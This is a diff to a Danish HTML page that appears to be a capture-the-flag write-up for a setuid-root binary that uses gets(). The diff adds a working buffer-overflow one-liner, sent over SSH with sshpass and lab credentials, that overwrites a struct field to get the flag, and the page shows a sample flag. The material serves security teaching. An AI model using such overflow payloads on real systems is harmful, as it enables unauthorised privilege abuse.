@@ -32,7 +32,10 @@
 <p>En SETUID-root binær <code>icecream-shop</code> (med kildekode) læser felter med <code>gets()</code>
              (ingen længde-check) ind i en struct, og giver flaget hvis <code>relationship == "my boss"</code>. Felterne
              ligger sammenhængende, så overflow af <code>amount</code> rammer <code>relationship</code>:</p>
-             <pre><code>printf 'x\nx\n%s\n' "$(python3 -c 'print("A"*100+"my boss")')" | ssh haaukins@icecream.hkn ./icecream-shop</code></pre>
+             <p>Login er de udleverede credentials <code>haaukins</code>/<code>haaukins</code>. Vi føder
+             payloaden til binæren over SSH (<code><span class="gloss" tabindex="0" data-tip="Leverer et SSH-password ikke-interaktivt, til brug i scripts.">sshpass</span></code> svarer password-prompten, så pipen virker
+             ikke-interaktivt):</p>
+             <pre><code>printf 'x\nx\n%s\n' "$(python3 -c 'print("A"*100+"my boss")')" | sshpass -p haaukins ssh haaukins@icecream.hkn ./icecream-shop</code></pre>
 <details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
 <p>Flag: <span class="flag">HKN{g3ts_c4us3s_6uff3r_0v3rfl0ws}</span></p>
 </details>
